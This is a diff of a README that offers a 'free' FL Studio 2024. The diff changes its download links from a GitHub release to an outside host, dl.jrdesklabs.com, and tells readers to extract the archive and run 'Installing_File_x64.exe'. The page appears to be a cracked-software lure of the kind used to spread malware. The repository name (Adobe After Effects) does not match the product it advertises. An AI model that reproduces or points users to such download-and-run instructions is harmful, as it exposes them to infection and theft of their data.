@@ -11,11 +11,11 @@ Tags: Fl Studio 2024 free. Download Fl Studio for free. Download free Fl Studio 
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/eac7b473-c791-4591-a217-a4642c018463)
-](https://github.com/Redwingshunt/Adobe-After-Effects-2024-/releases/download/V6.34/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/Redwingshunt/Adobe-After-Effects-2024-/releases/download/V6.34/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-16_22-42-22](https://github.com/user-attachments/assets/0fa2ba2c-a992-4da9-938f-41b043868863)
